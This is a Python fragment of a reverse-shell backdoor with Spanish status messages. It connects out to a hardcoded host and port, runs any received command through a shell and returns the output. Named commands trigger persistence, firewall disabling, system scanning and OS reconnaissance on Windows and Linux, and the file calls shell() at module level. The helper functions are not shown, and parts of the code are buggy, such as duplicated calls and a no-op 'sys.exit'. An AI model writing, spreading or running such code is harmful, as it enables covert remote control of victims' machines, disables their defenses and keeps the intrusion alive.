def shell():
    RHOST = '127.0.0.1'
    RPORT = 443
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    try:
        while True:
            data = s.recv(1024)
    #####################################################################################################################################
            if data == 'quit':
                s.close()
    #####################################################################################################################################
            elif data == 'os info':
                os_information = str(os_info())
                s.send(os_information)
    #####################################################################################################################################
            elif data == 'persistence':
                if System() == 'windows':
                    windows_persistence()
                    if windows_persistence() == True:
                        s.send('Persistencia completada')
                    else:
                        s.send('No se pudo realizar la persistencia')
                elif System() == 'linux':
                    linux_persistence()
                    if linux_persistence() == True:
                        s.send('Persistencia completada')
                    else:
                        s.send('No se pudo realizar la persistencia')
                else:
                    pass
    #####################################################################################################################################
            elif data == 'firewall':
                if System() == 'windows':
                    windows_firewall()
                    if windows_firewall() == True:
                        s.send('Se desactivó satisfactoriamente')
                    else:
                        s.send('No se pudo desactivar')
                elif System() == 'linux':
                    linux_firewall()
                    if linux_firewall() == True:
                        s.send('Se desactivó satisfactoriamente')
                    else:
                        s.send('No se pudo desactivar')
                else:
                    pass
    #####################################################################################################################################            
            elif data == 'scanner':
                if System() == 'windows':
                    windows_scanner()
                    result_scan=str(windows_scanner())
                    s.send(result_scan)
                elif System() == 'linux':
                    linux_scanner()
                    result_scan=str(linux_scanner())
                    s.send(result_scan)
                else:
                    pass
    #####################################################################################################################################
            else:
                comm = subprocess.Popen(str(data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
    #####################################################################################################################################
            try:
                s.send(STDOUT+STDERR)
            except:
                pass
        s.close()
    except:
        sys.exit
        pass

shell()
